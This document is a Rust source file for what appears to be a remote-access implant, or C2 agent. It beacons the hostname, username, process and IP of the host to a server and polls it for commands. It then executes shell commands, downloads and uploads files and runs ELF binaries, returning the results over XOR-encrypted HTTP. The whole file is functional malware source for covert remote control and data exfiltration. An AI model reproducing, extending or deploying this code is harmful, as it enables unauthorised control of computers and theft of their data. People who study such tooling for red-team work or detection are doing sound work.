mod crypt;
mod http;
mod sysinfo;
mod task;
mod config {
    include!(concat!(env!("OUT_DIR"), "/config.rs"));
}

extern crate libc;

use config::*;
use std::thread;
use std::time::Duration;
use uuid::Uuid;

// ── JSON helpers (no external parser dependency needed for simple structures) ──

fn json_str(key: &str, val: &str) -> String {
    format!("\"{}\":\"{}\"", key, val)
}

fn json_bool(key: &str, val: bool) -> String {
    format!("\"{}\":{}", key, val)
}

fn json_i64(key: &str, val: i64) -> String {
    format!("\"{}\":{}", key, val)
}

// ── Agent ID ──────────────────────────────────────────────────────────────────

fn generate_agent_id() -> String {
    Uuid::new_v4().to_string()
}

// ── Beacon ────────────────────────────────────────────────────────────────────

fn send_beacon(agent_id: &str, results_data: &str) -> Result<String, String> {
    let payload = format!(
        "{{{},{},{},{},{},{}}}",
        json_str("agent_id", agent_id),
        json_str("hostname", &sysinfo::get_hostname()),
        json_str("username", &sysinfo::get_username()),
        json_str("process_name", &sysinfo::get_process_name()),
        json_str("ip_address", &sysinfo::get_local_ip()),
        json_str("results", results_data),
    );

    let encrypted = crypt::encrypt(&payload, XOR_KEY);
    http::http_post(RESULTS_PATH, USER_AGENT, &encrypted)
}

// ── Fetch commands ────────────────────────────────────────────────────────────

struct Cmd {
    id: i64,
    text: String,
}

fn fetch_commands(agent_id: &str) -> Vec<Cmd> {
    let payload = format!("{{{}}}", json_str("agent_id", agent_id));
    let encrypted = crypt::encrypt(&payload, XOR_KEY);

    let raw = match http::http_post("/api/command", USER_AGENT, &encrypted) {
        Ok(r) if !r.is_empty() => r,
        _ => return vec![],
    };

    let clear = match crypt::decrypt(&raw, XOR_KEY) {
        Ok(s) => s,
        Err(_) => return vec![],
    };

    parse_commands(&clear)
}

fn parse_commands(json: &str) -> Vec<Cmd> {
    let mut result = Vec::new();

    let start = match json.find("\"commands\":[") {
        Some(p) => p + 12,
        None => return result,
    };

    let slice = &json[start..];
    let mut pos = 0;
    let chars: Vec<char> = slice.chars().collect();

    while pos < chars.len() {
        // skip whitespace and commas
        while pos < chars.len() && (chars[pos].is_whitespace() || chars[pos] == ',') {
            pos += 1;
        }
        if pos >= chars.len() || chars[pos] == ']' {
            break;
        }
        if chars[pos] != '{' {
            pos += 1;
            continue;
        }
        pos += 1; // skip '{'

        let mut cmd_id: Option<i64> = None;
        let mut cmd_text = String::new();

        while pos < chars.len() && chars[pos] != '}' {
            while pos < chars.len() && (chars[pos].is_whitespace() || chars[pos] == ',') {
                pos += 1;
            }
            if pos >= chars.len() || chars[pos] == '}' {
                break;
            }

            let remaining: String = chars[pos..].iter().collect();

            if remaining.starts_with("\"id\":") {
                pos += 5;
                while pos < chars.len() && chars[pos].is_whitespace() {
                    pos += 1;
                }
                let num_start = pos;
                while pos < chars.len() && chars[pos].is_ascii_digit() {
                    pos += 1;
                }
                let num_str: String = chars[num_start..pos].iter().collect();
                cmd_id = num_str.parse().ok();
            } else if remaining.starts_with("\"command\":\"") {
                pos += 11;
                let mut text = String::new();
                while pos < chars.len() {
                    if chars[pos] == '\\' && pos + 1 < chars.len() {
                        pos += 1;
                        text.push(chars[pos]);
                        pos += 1;
                        continue;
                    }
                    if chars[pos] == '"' {
                        pos += 1;
                        break;
                    }
                    text.push(chars[pos]);
                    pos += 1;
                }
                cmd_text = text;
            } else {
                pos += 1;
            }
        }
        pos += 1; // skip '}'

        if let Some(id) = cmd_id {
            if !cmd_text.is_empty() {
                result.push(Cmd { id, text: cmd_text });
            }
        }
    }

    result
}

// ── Parse command type ────────────────────────────────────────────────────────

fn parse_command_type(command: &str) -> (&str, &str) {
    // Format: 'type':'value'  or just plain cmd text
    let bytes = command.as_bytes();
    if bytes.first() != Some(&b'\'') {
        return ("cmd", command);
    }

    let sep1 = 0usize;
    let sep2 = match command[sep1 + 1..].find('\'') {
        Some(p) => sep1 + 1 + p,
        None => return ("cmd", command),
    };

    let cmd_type = &command[sep1 + 1..sep2];

    let colon = match command[sep2..].find(':') {
        Some(p) => sep2 + p,
        None => return ("cmd", command),
    };

    let after_colon = &command[colon + 1..];
    let sep3 = match after_colon.find('\'') {
        Some(p) => p,
        None => return ("cmd", command),
    };

    let value_start = sep3 + 1;
    let value_slice = &after_colon[value_start..];
    let value = match value_slice.find('\'') {
        Some(end) => &value_slice[..end],
        None => value_slice.trim_end_matches(|c: char| c == '\'' || c.is_whitespace()),
    };

    (cmd_type, value)
}

// ── Submit result ─────────────────────────────────────────────────────────────

fn submit_result(
    agent_id: &str,
    command_id: i64,
    output: &str,
    success: bool,
    types: &str,
    filename: Option<&str>,
) -> bool {
    let output_b64 = crypt::b64_encode(output.as_bytes());

    let mut payload = format!(
        "{{{},{},{},{},{}",
        json_str("agent_id", agent_id),
        json_i64("command_id", command_id),
        json_str("output", &output_b64),
        json_bool("success", success),
        json_str("types", types),
    );

    if let Some(fname) = filename {
        payload.push(',');
        payload.push_str(&json_str("filename", fname));
    }

    payload.push('}');

    let encrypted = crypt::encrypt(&payload, XOR_KEY);

    http::http_post(RESULT_PATH, USER_AGENT, &encrypted)
        .map(|r| !r.is_empty())
        .unwrap_or(false)
}

// ── Main loop ─────────────────────────────────────────────────────────────────

fn agent_run(agent_id: &str) {
    let _ = send_beacon(agent_id, "");

    loop {
        thread::sleep(Duration::from_secs(BEACON_INTERVAL));

        if send_beacon(agent_id, "").is_err() {
            continue;
        }

        let commands = fetch_commands(agent_id);
        if commands.is_empty() {
            continue;
        }

        for cmd in commands {
            let (cmd_type, cmd_value) = parse_command_type(&cmd.text);

            let (result, result_type, success, filename): (String, &str, bool, Option<String>) =
                match cmd_type {
                    "cmd" => {
                        let out = task::exec_cmd(cmd_value);
                        let ok = !out.starts_with("Error:");
                        (out, "text", ok, None)
                    }
                    "download" => {
                        let out = task::handle_download(cmd_value);
                        let ok = !out.starts_with("Error:");
                        (out, "file", ok, None)
                    }
                    "upload" => {
                        let out = task::handle_upload(cmd_value);
                        let ok = !out.starts_with("Error:") && !out.contains("Failed");
                        (out, "text", ok, None)
                    }
                    "elf-exec" => {
                        let out = task::handle_elf_exec(cmd_value);
                        let ok = !out.starts_with("Error:");
                        (out, "text", ok, None)
                    }
                    _ => (
                        format!("Error: Unknown command type: {}", cmd_type),
                        "text",
                        false,
                        None,
                    ),
                };

            submit_result(
                agent_id,
                cmd.id,
                &result,
                success,
                result_type,
                filename.as_deref(),
            );
        }
    }
}

fn main() {
    let agent_id = generate_agent_id();
    agent_run(&agent_id);
}
